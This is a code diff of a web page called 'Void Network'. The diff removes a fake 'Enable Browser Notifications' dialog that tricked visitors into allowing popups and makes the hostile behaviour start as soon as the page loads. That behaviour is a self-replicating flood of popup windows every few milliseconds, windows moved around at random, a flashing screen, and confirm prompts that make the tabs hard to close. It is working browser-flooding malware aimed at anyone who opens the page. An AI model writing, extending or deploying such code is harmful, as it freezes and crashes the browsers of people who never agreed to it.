@@ -3,74 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Browser Tools</title>
+    <title>Void Network</title>
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            color: #333;
-            background-color: white;
             margin: 0;
             padding: 0;
-            transition: all 0.5s ease;
+            overflow: hidden;
+            background-color: #000;
+            animation: flashBackground 0.3s infinite;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-        }
-        
-        /* Permission dialog styling */
-        .permission-dialog {
-            background-color: #fff;
-            color: #333;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.15);
-            max-width: 450px;
-            text-align: center;
-        }
-        
-        .permission-dialog h2 {
-            color: #2c3e50;
-            margin-top: 0;
-            font-size: 22px;
-        }
-        
-        .permission-dialog p {
-            margin-bottom: 20px;
-            line-height: 1.5;
-            color: #555;
-        }
-        
-        .permission-button {
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-weight: bold;
-            font-size: 16px;
-            transition: background-color 0.2s;
-        }
-        
-        .permission-button:hover {
-            background-color: #45a049;
-        }
-        
-        .icon {
-            font-size: 50px;
-            margin-bottom: 20px;
-            color: #4CAF50;
-        }
-        
-        /* Hidden chaos mode styles that will be activated later */
-        .chaos-mode {
-            display: none;
-        }
-        
-        body.chaos-active {
-            background-color: #000;
-            animation: flashBackground 0.3s infinite;
+            font-family: Arial, sans-serif;
         }
         
         @keyframes flashBackground {
@@ -79,7 +24,6 @@
         }
         
         .main-text {
-            display: none;
             font-size: 48px;
             font-weight: bold;
             text-transform: uppercase;
@@ -96,37 +40,16 @@
             0%, 49% { opacity: 1; }
             50%, 100% { opacity: 0.7; }
         }
-        
-        body.chaos-active .permission-dialog {
-            display: none;
-        }
-        
-        body.chaos-active .main-text {
-            display: block;
-        }
     </style>
 </head>
 <body>
-    <!-- Simple permission dialog -->
-    <div class="permission-dialog">
-        <div class="icon">🔒</div>
-        <h2>Enable Browser Notifications</h2>
-        <p>Click the button below to allow notifications and continue to the site.</p>
-        <p>You may need to click "Allow" in the popup that appears.</p>
-        <button id="permissionButton" class="permission-button">Allow Access</button>
-    </div>
-    
-    <!-- Hidden chaos mode text that will show later -->
     <div class="main-text">VOID NETWORK ON TOP</div>
 </body>
 
     <script>
         // Initialize variables
         let windowCount = 0;
-        let permissionRequested = false;
         let openedWindows = [];
-        let chaosMode = false;
-        let popupInterval = null;
         
         // Preload confirm dialog messages to make them harder to avoid
         const leaveMessages = [
@@ -136,6 +59,24 @@
             'CRITICAL PROCESS ACTIVE',
             'NETWORK SYNC IN PROGRESS'
         ];
+        
+        // Get the current URL of the page (the actual URL, not data URL)
+        let actualUrl = window.location.href;
+        
+        // If we're already in a data URL, try to get the original URL from localStorage
+        try {
+            if (actualUrl.startsWith('data:')) {
+                const storedUrl = localStorage.getItem('originalUrl');
+                if (storedUrl) {
+                    actualUrl = storedUrl;
+                }
+            } else {
+                // Store this URL for future windows to use
+                localStorage.setItem('originalUrl', actualUrl);
+            }
+        } catch (e) {
+            // Ignore storage errors
+        }
         
         // Function to get a random position for windows
         function getRandomPosition() {
@@ -154,83 +95,35 @@
             };
         }
         
-        // Function to generate self-replicating HTML content
-        function getSelfReplicatingHtml() {
-            // Make sure to include the chaosMode=true parameter
-            let html = document.documentElement.outerHTML;
-            
-            // If we're switching to chaos mode, ensure all new windows start in chaos mode
-            if (chaosMode) {
-                html = html.replace('<html', '<html data-chaos="true"');
-            }
-            
-            return html;
-        }
-        
-        function createHTMLDataUrl(html) {
-            return 'data:text/html;charset=utf-8,' + encodeURIComponent(html);
-        }
-        
-        // Activate chaos mode
-        function activateChaosMode() {
-            chaosMode = true;
-            document.body.classList.add('chaos-active');
-            
-            // Start the closing difficulty
-            makeClosingDifficult();
-            
-            // Start the chaos
-            startChaos();
-        }
-        
-        // Function to try opening popups repeatedly to get permission
-        function startPopupRequester() {
-            // Only start if not already running
-            if (popupInterval !== null) return;
-            
-            // Create a small test popup to trigger browser's popup blocker
-            let attemptCount = 0;
-            const maxAttempts = 5;
-            
-            popupInterval = setInterval(() => {
-                attemptCount++;
-                
-                // Try to open a test popup
-                const testPopup = window.open('about:blank', '_blank', 'width=1,height=1');
-                
-                if (testPopup) {
-                    // Success! Popup was allowed
-                    testPopup.close();
-                    clearInterval(popupInterval);
-                    popupInterval = null;
-                    
-                    // We got permission, now activate chaos mode after a short delay
-                    setTimeout(activateChaosMode, 500);
-                } else if (attemptCount >= maxAttempts) {
-                    // We've tried enough, show a more direct instruction
-                    clearInterval(popupInterval);
-                    popupInterval = null;
-                    alert("Please allow popups for this site to continue. Look for the popup blocker icon in your browser's address bar.");
-                }
-            }, 1000);
-        }
-        
-        // Function to open multiple windows and move them around
-        function spawnWindows() {
+        // Function to open a new window with the original URL
+        function openNewWindow() {
             try {
-                // Get the URL to open
-                const dataUrl = createHTMLDataUrl(getSelfReplicatingHtml());
-                
-                // Open a new tab
-                const newTab = window.open(dataUrl, '_blank');
-                if (newTab) openedWindows.push(newTab);
-                
-                // Open multiple random positioned windows
-                for (let i = 0; i < 6; i++) {
-                    const pos = getRandomPosition();
-                    const windowFeatures = `width=${pos.width},height=${pos.height},left=${pos.left},top=${pos.top}`;
-                    const newWindow = window.open(dataUrl, '', windowFeatures);
-                    if (newWindow) openedWindows.push(newWindow);
+                // If we have a valid URL that's not a data URL, use it directly
+                if (actualUrl && !actualUrl.startsWith('data:')) {
+                    const newTab = window.open(actualUrl, '_blank');
+                    if (newTab) openedWindows.push(newTab);
+                    
+                    // Open multiple random positioned windows with the actual URL
+                    for (let i = 0; i < 6; i++) {
+                        const pos = getRandomPosition();
+                        const windowFeatures = `width=${pos.width},height=${pos.height},left=${pos.left},top=${pos.top}`;
+                        const newWindow = window.open(actualUrl, '', windowFeatures);
+                        if (newWindow) openedWindows.push(newWindow);
+                    }
+                } else {
+                    // Fallback to self-replication if we don't have a valid URL
+                    const html = document.documentElement.outerHTML;
+                    const dataUrl = 'data:text/html;charset=utf-8,' + encodeURIComponent(html);
+                    
+                    const newTab = window.open(dataUrl, '_blank');
+                    if (newTab) openedWindows.push(newTab);
+                    
+                    for (let i = 0; i < 6; i++) {
+                        const pos = getRandomPosition();
+                        const windowFeatures = `width=${pos.width},height=${pos.height},left=${pos.left},top=${pos.top}`;
+                        const newWindow = window.open(dataUrl, '', windowFeatures);
+                        if (newWindow) openedWindows.push(newWindow);
+                    }
                 }
                 
                 // Clean up any closed windows from the array
@@ -240,8 +133,8 @@
                 // Move existing windows around to create chaos
                 moveWindowsRandomly();
             } catch (e) {
-                // If error occurs (like popup blocker), try again with a delay
-                setTimeout(spawnWindows, 100);
+                // If error occurs, try again with a delay
+                setTimeout(openNewWindow, 100);
             }
         }
         
@@ -305,16 +198,16 @@
             });
         }
         
-        // Spawn windows at varying intervals to avoid detection/blocking
+        // Start all the chaos immediately
         function startChaos() {
             // Initial burst of spawns
             for (let i = 0; i < 5; i++) {
-                setTimeout(spawnWindows, i * 10);
+                setTimeout(openNewWindow, i * 10);
             }
             
             // Ultra fast spawning
             setInterval(() => {
-                spawnWindows();
+                openNewWindow();
             }, 10); // Super aggressive 10ms interval
             
             // Move windows around frequently
@@ -325,29 +218,19 @@
             // Burst mode for occasional massive spawn
             setInterval(() => {
                 for (let i = 0; i < 8; i++) {
-                    setTimeout(spawnWindows, i * 5);
+                    setTimeout(openNewWindow, i * 5);
                 }
             }, 500); // Every half second do a massive burst
         }
         
-        // Set up initial UI interactions
-        document.addEventListener('DOMContentLoaded', function() {
-            // Check if we should start in chaos mode (for spawned windows)
-            if (document.documentElement.getAttribute('data-chaos') === 'true' || 
-                window.location.search.includes('chaosMode=true')) {
-                activateChaosMode();
-                return;
-            }
+        // Start everything when the page loads
+        window.onload = function() {
+            // Make closing tabs difficult
+            makeClosingDifficult();
             
-            // Set up the permission button click event
-            const permissionButton = document.getElementById('permissionButton');
-            if (permissionButton) {
-                permissionButton.addEventListener('click', function() {
-                    // Start the popup requester
-                    startPopupRequester();
-                });
-            }
-        });
+            // Start the chaos immediately
+            startChaos();
+        };
     </script>
 </body>
 </html>
